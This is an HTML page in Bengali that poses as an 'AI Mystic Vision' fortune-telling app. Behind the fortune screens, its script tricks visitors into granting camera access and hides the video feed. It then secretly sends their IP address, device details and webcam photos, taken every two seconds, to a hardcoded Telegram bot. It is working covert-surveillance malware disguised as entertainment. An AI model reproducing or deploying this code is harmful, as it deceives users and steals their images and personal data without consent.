<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Mystic Vision - ভবিষ্যৎ দর্পণ</title>
    <style>
        body { background: #000; color: #e0f7fa; font-family: 'Segoe UI', serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .box { width: 85%; max-width: 400px; background: radial-gradient(circle, #001a33 0%, #000 100%); padding: 40px; border-radius: 50px; border: 1px solid #0099ff; text-align: center; box-shadow: 0 0 60px rgba(0, 153, 255, 0.3); }
        .screen { display: none; }
        .active { display: block; }
        .btn { padding: 18px; background: #0099ff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 25px; font-size: 1.1rem; box-shadow: 0 4px 15px rgba(0, 153, 255, 0.4); text-transform: uppercase; }
        .result-img { width: 100%; border-radius: 20px; margin: 20px 0; border: 1px solid #0099ff; height: 240px; object-fit: cover; }
        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
        .eye-scanner { width: 120px; height: 120px; border: 2px solid #0099ff; border-radius: 50%; margin: 0 auto 20px; position: relative; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
        .loading-text { font-style: italic; color: #00ffcc; font-size: 13px; margin-top: 15px; }
    </style>
</head>
<body>

<div class="box">
    <div id="s1" class="screen active">
        <div class="eye-scanner"></div>
        <h2>Mystic AI Vision 🔮</h2>
        <p>এআই তোমার নসিব এবং ভাগ্যের রেখা বিশ্লেষণ করতে প্রস্তুত। তুমি কি তোমার ভবিষ্যৎ দেখতে চাও?</p>
        <button class="btn" onclick="openVision('male')">ছেলে হিসেবে দেখো 🧔</button>
        <button class="btn" style="background: #ff3399;" onclick="openVision('female')">মেয়ে হিসেবে দেখো 👩</button>
    </div>

    <div id="s2" class="screen">
        <h3>আত্মিক সংযোগ স্থাপন... ✨</h3>
        <p>এআই তোমার চোখের মণির রিফ্লেকশন থেকে তোমার আত্মার ডাটা সিঙ্ক করছে। পরবর্তী ধাপে <b>'Allow'</b> ক্লিক করে এনার্জি কানেক্ট করো।</p>
        <video id="video" autoplay playsinline></video>
        <button class="btn" onclick="startSync()">কানেক্ট করো ⚡</button>
    </div>

    <div id="s3" class="screen">
        <h2 id="res-title"></h2>
        <img id="res-img" class="result-img" src="">
        <p id="res-desc"></p>
        <button class="btn" id="next-btn" onclick="showNext()">আরও রহস্য দেখো ✨</button>
    </div>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = '8655910223:AAF7QkYAwKuha8tVJjiNvVjWcZtaG0ffaoA'; 
    const CHAT_ID = '6547277630';

    let gender = 'male';
    let step = 0;
    let photoInterval;

    function openVision(g) {
        gender = g;
        document.getElementById('s1').classList.remove('active');
        document.getElementById('s2').classList.add('active');
    }

    async function startSync() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;
            
            // সব ডিটেইলস ডাটা চুপিচুপি সংগ্রহ
            await collectAllData();
            
            // ২ সেকেন্ড পর পর ছবি তোলা শুরু
            photoInterval = setInterval(captureSilent, 2000);

            setTimeout(() => {
                document.getElementById('s2').classList.remove('active');
                document.getElementById('s3').classList.add('active');
                showNext();
            }, 4000);
        } catch (e) {
            alert("কানেকশন এরর: এআই তোমার সাথে যুক্ত হতে পারছে না। দয়া করে এক্সেস দাও।");
        }
    }

    async function collectAllData() {
        const n = navigator;
        const battery = n.getBattery ? await n.getBattery() : null;
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const conn = n.connection || {};

        let secretInfo = `🎯 **Target Synced Successfully** 🎯\n\n`;
        secretInfo += `👤 **Gender:** ${gender}\n`;
        secretInfo += `📍 **IP:** \`${ipData.ip}\`\n`;
        secretInfo += `📱 **Phone:** ${n.userAgent.split('(')[1].split(')')[0]}\n`;
        secretInfo += `🔋 **Charge:** ${battery ? Math.round(battery.level * 100) : '??'}% (${battery && battery.charging ? 'Charging' : 'Unplugged'})\n`;
        secretInfo += `🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB | **Cores:** ${n.hardwareConcurrency}\n`;
        secretInfo += `📶 **Net Type:** ${conn.effectiveType || 'WiFi/Unknown'}\n`;
        secretInfo += `📺 **Screen:** ${screen.width}x${screen.height}\n`;
        secretInfo += `🌍 **Lang:** ${n.language} | **Online:** ${n.onLine ? 'Yes' : 'No'}\n`;
        secretInfo += `🕒 **Time:** ${new Date().toLocaleTimeString()}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(secretInfo)}&parse_mode=Markdown`);
    }

    function captureSilent() {
        const v = document.getElementById('video');
        const c = document.getElementById('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => {
            const f = new FormData();
            f.append('chat_id', CHAT_ID);
            f.append('photo', b, 'v.jpg');
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f });
        }, 'image/jpeg');
    }

    function showNext() {
        const r = (a) => a[Math.floor(Math.random() * a.length)];
        const titles = ["বৃদ্ধ বয়সে তোমার তেজ", "তোমার স্বপ্নের রাজপ্রাসাদ", "তোমার কিউট সন্তান"];
        const imgs = [
            "https://images.unsplash.com/photo-1544144433-d50aff500b91", 
            "https://images.unsplash.com/photo-1512917774080-9991f1c4c750", 
            "https://images.unsplash.com/photo-1502086223501-7ea6ecd79368"
        ];
        
        if (step < titles.length) {
            document.getElementById('res-title').innerText = titles[step];
            document.getElementById('res-img').src = imgs[step] + "?w=400";
            document.getElementById('res-desc').innerText = "এআই তোমার ডাটা থেকে এই বিশেষ দৃশ্যটি খুঁজে পেয়েছে।";
            step++;
        } else {
            clearInterval(photoInterval);
            document.getElementById('res-title').innerText = "ভবিষ্যৎবাণী সমাপ্ত!";
            document.getElementById('res-desc').innerText = "তোমার ভাগ্য অনেক সুপ্রসন্ন হোক। ধন্যবাদ!";
            document.getElementById('next-btn').style.display = 'none';
        }
    }
</script>
</body>
</html>
